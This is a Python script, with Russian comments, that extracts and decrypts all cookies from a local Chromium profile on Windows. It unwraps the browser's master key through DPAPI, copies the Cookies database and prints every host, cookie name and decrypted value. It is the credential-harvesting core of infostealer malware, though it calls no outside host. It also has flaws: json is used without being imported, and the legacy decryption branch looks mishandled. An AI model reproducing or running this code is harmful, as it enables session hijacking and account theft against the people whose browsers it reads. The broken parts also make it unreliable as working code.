import platform
import sqlite3
import os
import shutil
import base64
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
import tempfile
import random
from pathlib import Path

def get_encryption_key(profile_path):
    """Получает ключ шифрования"""
    if platform.system() != "Windows":
        return None
    
    # Поиск Local State
    possible_paths = [
        Path(profile_path) / "Local State",
        Path(profile_path).parent / "Local State"
    ]
    
    for path in possible_paths:
        if path.exists():
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            except:
                pass
    return None

def decrypt_value(encrypted_value, key):
    """Исправленная расшифровка куков"""
    if not encrypted_value:
        return ""
    
    # Формат v10/v11 (AES-GCM)
    if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
        nonce = encrypted_value[3:15]
        ciphertext = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        try:
            return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
        except:
            return "DECRYPT_FAILED"
    
    # Старый формат CBC
    elif len(encrypted_value) > 15:
        iv = encrypted_value[3:15]
        ciphertext = encrypted_value[15:]
        
        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
        plaintext = cipher.decrypt(ciphertext)
        return plaintext[:-plaintext[-1]].decode('utf-8')
    
    return "UNKNOWN_FORMAT"

def chromium_cookies():
    cookies_path = os.path.join(os.getenv("LOCALAPPDATA"), 'Chromium', 'User Data', 'Default', 'Cookies')
    if not os.path.exists(cookies_path):
        return ""
    
    profile_path = os.path.join(os.getenv("LOCALAPPDATA"), 'Chromium', 'User Data')
    key = get_encryption_key(profile_path)
    if not key:
        return "KEY_ERROR"
    
    # Работа с временной копией
    temp_db = os.path.join(tempfile.gettempdir(), f"cookies_temp_{random.randint(1000,9999)}.db")
    shutil.copy2(cookies_path, temp_db)
    
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    
    result_text = "URL | COOKIE | NAME\n"
    for host, name, enc_value in cursor.fetchall():
        decrypted = decrypt_value(enc_value, key) if enc_value else ""
        result_text += f"{host} | {decrypted} | {name}\n"
    
    conn.close()
    os.remove(temp_db)
    return result_text

# Полный код с исправлением
def main():
    cookies = chromium_cookies()
    print(cookies)

if __name__ == "__main__":
    main()
